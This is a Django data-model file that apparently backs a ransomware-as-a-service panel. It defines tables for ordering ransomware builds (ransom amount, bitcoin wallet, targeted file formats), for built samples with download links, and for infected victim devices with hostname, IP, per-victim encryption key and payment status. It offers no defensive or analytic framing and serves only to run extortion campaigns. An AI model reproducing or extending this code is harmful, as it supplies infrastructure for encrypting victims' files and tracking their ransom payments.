from django.db import models
from django.contrib.auth.models import User

# Create your models here.

class RansomwaresAdd(models.Model):
    STATUS  = (('Waiting', 'Waiting'),('Created', 'Created'),('Closed', 'Closed'))
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    name = models.CharField(max_length=30)
    amount = models.CharField(max_length=50)
    bitcoinaccount = models.CharField(max_length=200)
    file_formats = models.TextField(max_length=500)
    status = models.CharField(max_length=20, choices=STATUS, default='waiting') 
    def __str__(self):
        return "{}---{}---{}".format(self.user,self.name,self.status)  


class Ransomwares(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    token = models.CharField(max_length=100)
    name = models.CharField(max_length=30)
    amount = models.CharField(max_length=50)
    bitcoinaccount = models.CharField(max_length=200)
    url = models.CharField(max_length=200,default='No Link Create Ransomware !')
    def __str__(self):
        return "{}---{}---{}".format(self.user,self.name,self.url)     

class Devices(models.Model):
    STATUS  = (
		('payments', 'Payments'),
		('inProcess', 'InProcess'),
        ('successful', 'Successful'),
        ('unsuccessful', 'Unsuccessful')
    )
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    ransomwares = models.ForeignKey(Ransomwares, on_delete=models.CASCADE)
    username_id = models.CharField(max_length=30)
    hostname = models.CharField(max_length=30)	
    ip = models.CharField(max_length=30)	
    key = models.CharField(max_length=200)	
    amount = models.CharField(max_length=100)
    status = models.CharField(max_length=20, choices=STATUS, default='inProcess') 
    def __str__(self):
        return "{}---{}---{}---{}".format(self.user,self.ransomwares,self.username_id,self.status)  